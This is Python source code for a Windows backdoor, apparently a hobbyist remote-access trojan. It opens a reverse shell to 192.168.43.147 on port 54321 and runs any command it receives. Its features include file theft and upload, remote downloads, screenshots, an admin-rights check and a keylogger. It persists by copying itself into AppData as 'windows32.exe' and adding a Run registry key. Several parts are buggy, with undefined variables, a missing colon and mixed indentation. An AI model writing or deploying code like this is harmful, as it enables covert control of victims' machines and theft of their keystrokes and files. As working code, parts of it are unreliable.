#!/usr/bin/python

import socket
import subprocess
import json
import os
import base64
import shutil
import sys
import time
#for pinging the reverse shell every 20sec
import requests
#for requesting the shell to download files from web via requests
from mss import mss
#for screenshot
import threading
import keylogger


def reliable_send(data):
        json_data = json.dumps(data)
        sock.send(json_data)


def reliable_recv():
        data = ""
        while True:
                try:
			data = data + sock.recv(1024)
			return json.loads(data)
                except ValueError:
                        continue

def is_admin():
#checks if we have admin priviledges
	global admin
	try:
		temp = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\windows'),'temp']))
	except:
		admin = "[!!]User priviledges!"
	else:
		admin = "[+]Administrator priviledges!"

def screenshot():
	with mss() as screenshot:
		screenshot.shot()

def download():
#downloading files to target pc from internet
	get_request = requests.get(url)
	file_name = url.split("/")[-1]
	with open(file_name, "wb") as out_file:
		out_file.write(get_response.content)

def connection():
	while True:
		time.sleep(20)
		try:
			sock.connect(("192.168.43.147",54321))
			shell()
		except:
			connection()

def shell():
	while True:
        	command = reliable_recv()
        	if command == 'q':
                	break
		elif command == "help":
			help_options = '''					download path --> Download a file From target PC
					upload path --> upload  a File to target pc
					get url     --> Download a file to target pc From any website
					start path  --> Start a Program on Target pc
					screenshot  --> Take a screenshot on Target monitor
					check       --> check For the administator priviledges
					keylog_start --> Start the keylogger
					keylog_dump --> Will dump the keystroke from keylogger
					q	    --> Exit from the reverse shell '''
		elif command[:2] == "cd" and len(command) > 1:
			try:
				os.chdir(command[3:])
		#changing of directory
			except:
				continue
        	elif command[:8] == "download":
                        with open(command[9:],"rb") as file:
				reliable_send(base64.b64encode(file.read()))
                elif command[:6] == "upload":
			with open(command[7:], "wb") as fin:
				file_data = reliable_recv()
				fin.write(base64.b64decode(file_data))

		elif command[:3] == "get":
			try:
				download(command[4:])
				reliable_send("[+] Downloaded file from specified url!")
			except:
				reliable_send("[-] Failed download that file")
		elif command[:10] == "screenshot":
			try:
				screenshot()
				with open("monitor-1.png","rb")as sc:
					reliable_send(base64.b64encode(sc.read()))
				os.remove("monitor-1.png")
			except:
				reliable_send("[!!]Failed to take screenshot")
		elif command[:5] == "start":
			try:
				subprocess.Popen(command[6:], shell=True)
				reliable_send("[+]Started!")
			except:
				reliable_send("[!!] Failed to Start!")
		elif command[:5] == "check":
			try:
				is_admin()
				reliable_send(admin)
			except:
				reliable_send("can't perform the check ")
		elif command[:12] == "keylog_start":
			t1 = threading.Thread(target=keylogger.start)
			t1.start()
		elif command[:11] == "keylog_dump"
			fn = open(keylogger_path, "r")
			reliable_send(fn.read())
		else:
                	#message = "HEllo World"
                	#sock.send(message)
			proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			result = proc.stdout.read() + proc.stderr.read()
			reliable_send(result)

keylogger_path = os.environ["appdata"] + "\\processmanager.txt"
location = os.environ["appdata"] + "\\windows32.exe"
if not os.path.exists(location):
	shutil.copyfile(sys.executable,location)
	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "'+ location + '"', shell=True)
	#makes registry key to after every restart and run our backdoor

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("192.168.43.147",54321))

connection()
#shell()
sock.close()


